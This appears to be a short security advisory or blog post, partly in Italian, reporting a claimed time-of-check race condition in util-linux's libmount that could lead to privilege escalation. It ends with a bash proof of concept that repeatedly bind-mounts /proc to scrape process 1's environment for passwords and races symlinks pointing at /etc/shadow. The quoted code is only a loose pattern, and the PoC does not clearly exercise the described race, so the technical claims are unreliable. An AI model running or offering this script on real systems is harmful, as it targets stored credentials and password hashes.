util-linux: CVE-Worthy Race Condition in libmount

linuxutil-linuxrace-conditionprivilege-escalation

Overview

Durante una sessione di code review su util-linux 2.39, ho identificato una race condition critica in libmount che, in condizioni specifiche, può essere sfruttata per escalation dei privilegi in ambienti multi-tenant Linux.

Affected Component

util-linux >= 2.36
libmount/src/context_mount.c
Funzione: mnt_context_mount()

Root Cause Analysis

Il problema risiede nella finestra temporale tra la verifica delle permission e l’effettiva operazione di mount…

1/* VULNERABLE CODE PATTERN */
2if (mnt_context_get_user_mount_options(cxt)) {
3    /* TOCTOU window here */
4    rc = mnt_context_prepare_mount(cxt);
5}

Proof of Concept

 1#!/bin/bash
 2# RingZero PoC — timing attack on libmount
 3# Use in controlled lab environment only
 4
 5TARGET="/tmp/rzp_test"
 6mkdir -p $TARGET
 7
 8while true; do
 9    mount --bind /proc $TARGET 2>/dev/null && \
10    cat $TARGET/1/environ 2>/dev/null | tr '\0' '\n' | grep -i pass
11done &
12
13# Race the symlink
14for i in $(seq 1 1000); do
15    ln -sf /etc/shadow $TARGET 2>/dev/null
16    rm -f $TARGET 2>/dev/null
17    mkdir -p $TARGET 2>/dev/null
18done
